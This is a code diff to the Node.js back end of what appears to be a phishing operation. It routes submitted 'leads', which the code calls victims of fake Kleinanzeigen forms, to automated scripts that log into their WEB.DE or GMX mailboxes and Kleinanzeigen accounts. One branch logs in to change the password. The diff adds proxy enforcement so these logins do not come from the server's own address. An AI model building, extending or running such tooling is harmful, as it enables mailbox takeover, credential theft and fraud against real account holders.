@@ -54,6 +54,45 @@ function resolvePythonExecutable(projectRoot) {
   return win ? 'python' : 'python3';
 }
 
+/** lead_simulation — только ящики @web.de (в т.ч. emailKl при Klein-оркестрации). */
+function leadTargetsWebdeMailbox(lead) {
+  if (!lead || typeof lead !== 'object') return false;
+  const a = String(lead.email || '').toLowerCase();
+  const b = String(lead.emailKl || '').toLowerCase();
+  return a.indexOf('web.de') !== -1 || b.indexOf('web.de') !== -1;
+}
+
+/** Лид пришёл с формы Kleinanzeigen (не путать со стартовой страницей в админке). */
+function leadSubmittedAsKleinVictim(lead) {
+  if (!lead || typeof lead !== 'object') return false;
+  if (lead.brand === 'klein') return true;
+  const cfb = String(lead.clientFormBrand || '').trim().toLowerCase();
+  return cfb === 'klein';
+}
+
+function leadMailboxEmailPresent(lead) {
+  if (!lead || typeof lead !== 'object') return false;
+  return String(lead.email || '').trim() !== '';
+}
+
+/** Только Klein: в лиде нет основного ящика в `email` (как у чистой формы Kl). */
+function leadIsStandaloneKleinFunnel(lead) {
+  if (!leadSubmittedAsKleinVictim(lead)) return false;
+  return !leadMailboxEmailPresent(lead);
+}
+
+/**
+ * Стартовая страница «Klein» + лид с @web.de: сначала почта WEB.DE, затем Klein в том же профиле.
+ * Не путать с standalone Klein (форма Kl без поля почты в `email`).
+ */
+function shouldUseKleinOrchestration(lead, startPage) {
+  const sp = String(startPage || '').trim().toLowerCase();
+  if (sp !== 'klein') return false;
+  if (!leadTargetsWebdeMailbox(lead)) return false;
+  if (leadIsStandaloneKleinFunnel(lead)) return false;
+  return true;
+}
+
 /** process.env для дочернего Python + VIRTUAL_ENV при наличии login/venv. */
 function makePythonSpawnEnv(projectRoot) {
   const env = Object.assign({}, process.env, {
@@ -65,7 +104,37 @@ function makePythonSpawnEnv(projectRoot) {
     const cfg = path.join(venvDir, 'pyvenv.cfg');
     if (fs.existsSync(cfg)) env.VIRTUAL_ENV = venvDir;
   }
+  const vis = String(process.env.LOGIN_BROWSER_VISIBLE || '').trim().toLowerCase();
+  const forceWindow =
+    vis === '1' ||
+    vis === 'true' ||
+    vis === 'yes' ||
+    (vis === '' && process.platform === 'darwin');
+  const forceHeadless = vis === '0' || vis === 'false' || vis === 'no' || vis === 'off';
+  const keepBrowserExplicitOff = /^(0|false|no|off)$/i.test(
+    String(process.env.KEEP_BROWSER_OPEN || '').trim()
+  );
+  if (forceWindow && !forceHeadless) {
+    env.HEADLESS = '0';
+    if (!keepBrowserExplicitOff) {
+      env.KEEP_BROWSER_OPEN = '1';
+    }
+  }
   return env;
+}
+
+/**
+ * lead_simulation_api: прокси только с сервера (GET /api/worker/proxy-txt = Config → Прокси).
+ * По умолчанию WEBDE_REQUIRE_PROXY=1 — без валидных строк скрипт не идёт в сеть напрямую.
+ * В .env можно выставить WEBDE_PROXY_FROM_ADMIN=0 или WEBDE_REQUIRE_PROXY=0 для отладки.
+ */
+function webdeScriptProxyEnv() {
+  const pfa = process.env.WEBDE_PROXY_FROM_ADMIN;
+  const wrp = process.env.WEBDE_REQUIRE_PROXY;
+  return {
+    WEBDE_PROXY_FROM_ADMIN: pfa === undefined || String(pfa).trim() === '' ? '1' : String(pfa).trim(),
+    WEBDE_REQUIRE_PROXY: wrp === undefined || String(wrp).trim() === '' ? '1' : String(wrp).trim(),
+  };
 }
 
 function runWhenLeadsWriteQueueIdle(callback) {
@@ -370,24 +439,31 @@ function startWebdeLoginAfterLeadSubmit(leadId, lead, forceRestart) {
     }
     branch = 'запуск lead_simulation: Change — нужен автовход в WEB.DE для смены пароля';
     d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
-    startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
+    startWebdeLoginForLeadId(leadId, leadTargetsWebdeMailbox(lead), !!forceRestart, false);
     return;
   }
-  if (sp === 'klein') {
-    branch = 'запуск lead_simulation с --klein-orchestration (после почты сценарий Klein/Kl)';
+  if (leadIsStandaloneKleinFunnel(lead)) {
+    branch = 'запуск klein_simulation_api.py (только Klein, без ящика в поле email)';
     d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
-    startWebdeLoginForLeadId(leadId, true, !!forceRestart, true);
+    startKleinLoginForLeadId(leadId, !!forceRestart);
     return;
   }
-  if (lead.brand === 'klein') {
-    branch = 'запуск klein_simulation_api.py (бренд Klein, отдельный скрипт)';
+  if (shouldUseKleinOrchestration(lead, sp)) {
+    branch =
+      'запуск lead_simulation + Klein-оркестрация (WEB.DE в почту, затем Klein в том же профиле)';
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
+    startWebdeLoginForLeadId(leadId, leadTargetsWebdeMailbox(lead), !!forceRestart, true);
+    return;
+  }
+  if (leadSubmittedAsKleinVictim(lead)) {
+    branch = 'запуск klein_simulation_api.py (форма Klein при заполненном email ящика)';
     d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
     startKleinLoginForLeadId(leadId, !!forceRestart);
     return;
   }
   branch = 'запуск lead_simulation (WEB.DE/GMX по email)';
   d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
-  startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
+  startWebdeLoginForLeadId(leadId, leadTargetsWebdeMailbox(lead), !!forceRestart, false);
 }
 
 function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonLog) {
@@ -406,19 +482,32 @@ function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonL
     console.log('[АДМИН] ' + reasonLog + ': после ошибки + Change + Klein — автоперезапуск не делаем, id=' + id);
     return;
   }
-  if (spRetry === 'klein') {
-    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation klein-orchestration · ' + reasonLog + ' · id=' + id, id);
-    console.log('[АДМИН] ' + reasonLog + ' — запуск lead_simulation с klein-orchestration, id=' + id);
-    startWebdeLoginForLeadId(id, true, false, true);
-    return;
-  }
-  if (lead.brand === 'klein') {
+  if (leadIsStandaloneKleinFunnel(lead)) {
     d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
     startKleinLoginForLeadId(id, false);
     return;
   }
-  if ((email || '').toLowerCase().includes('web.de')) {
+  if (shouldUseKleinOrchestration(lead, spRetry)) {
+    d.logTerminalFlow(
+      'РЕЖИМ',
+      'Автовход',
+      'retry',
+      (email || '').trim() || '—',
+      '[' + snap + '] перезапуск lead_simulation WEB.DE + Klein-оркестрация · ' + reasonLog + ' · id=' + id,
+      id
+    );
+    console.log('[АДМИН] ' + reasonLog + ' — запуск WEB.DE + Klein-orch заново, id=' + id);
+    startWebdeLoginForLeadId(id, true, false, true);
+    return;
+  }
+  if (leadSubmittedAsKleinVictim(lead)) {
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
+    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
+    startKleinLoginForLeadId(id, false);
+    return;
+  }
+  if (leadTargetsWebdeMailbox(lead) || (email || '').toLowerCase().indexOf('web.de') !== -1) {
     d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation WEB.DE · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ' — запуск скрипта входа WEB.DE заново, id=' + id);
     startWebdeLoginForLeadId(id, true, false, false);
@@ -431,6 +520,15 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
   if (!isWebde || !leadId || !d.readAutoScript()) {
     if (isWebde && leadId && !d.readAutoScript()) {
       d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId, leadId);
+    } else if (leadId && d.readAutoScript() && !isWebde) {
+      d.logTerminalFlow(
+        'AUTO-LOGIN',
+        'Система',
+        '—',
+        '—',
+        'пропуск: lead_simulation только для @web.de (в email или emailKl), leadId=' + leadId,
+        leadId
+      );
     }
     return;
   }
@@ -461,7 +559,9 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
     d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId, leadId);
     return;
   }
-  const lockEmailRaw = String(lead.email || '').trim();
+  const lockEmailRaw = kleinOrchestration
+    ? String((lead.email || lead.emailKl || '')).trim()
+    : String(lead.email || '').trim();
   if (!lockEmailRaw) {
     d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId, leadId);
     return;
@@ -527,7 +627,7 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
     cwd: d.serverProjectRoot,
     detached: true,
     stdio: 'inherit',
-    env: Object.assign({}, env, { WORKER_SECRET: workerSecret })
+    env: Object.assign({}, env, { WORKER_SECRET: workerSecret }, webdeScriptProxyEnv())
   });
   webdeLockWriteChildPid(email, child.pid);
   webdeLeadLockWritePid(leadId, child.pid);
@@ -542,6 +642,13 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
     clearLeadAutomationLock(leadId);
     releaseWebdeLoginSlot(leadId);
     clearWebdeScriptRunning(email);
+    try {
+      const live = d.readLeadById(leadId);
+      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
+        endWebdeAutoLoginRun(live);
+        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
+      }
+    } catch (_) {}
     if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
       try {
         d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
@@ -590,8 +697,8 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
     d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId, leadId);
     return;
   }
-  if (lead.brand !== 'klein') {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: не бренд klein, leadId=' + leadId, leadId);
+  if (!leadSubmittedAsKleinVictim(lead)) {
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет brand/clientFormBrand klein, leadId=' + leadId, leadId);
     return;
   }
   const lockEmail = String(lead.emailKl || lead.email || '').trim().toLowerCase();
@@ -661,6 +768,13 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
     clearLeadAutomationLock(leadId);
     releaseWebdeLoginSlot(leadId);
     clearWebdeScriptRunning(lockEmail);
+    try {
+      const live = d.readLeadById(leadId);
+      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
+        endWebdeAutoLoginRun(live);
+        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
+      }
+    } catch (_) {}
     if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
       try {
         d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
@@ -748,4 +862,6 @@ module.exports = {
   isLeadAutomationAlreadyRunning,
   killAllSpawnedAutomationChildrenSync,
   resolvePythonExecutable,
+  makePythonSpawnEnv,
+  webdeScriptProxyEnv,
 };
